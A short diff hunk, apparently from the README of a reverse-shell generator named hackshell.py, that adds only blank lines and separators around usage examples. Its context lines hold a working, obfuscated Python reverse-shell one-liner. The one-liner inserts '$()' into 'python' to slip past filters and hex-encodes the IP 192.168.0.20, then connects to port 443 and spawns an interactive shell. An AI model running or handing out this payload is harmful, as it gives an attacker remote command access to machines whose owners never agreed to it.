@@ -41,10 +41,13 @@ python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex
 ```
 py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0xC0A80014",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
 ```
+
 ---
+
 `
 python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type octa
 `
+
 ---
 
 ```
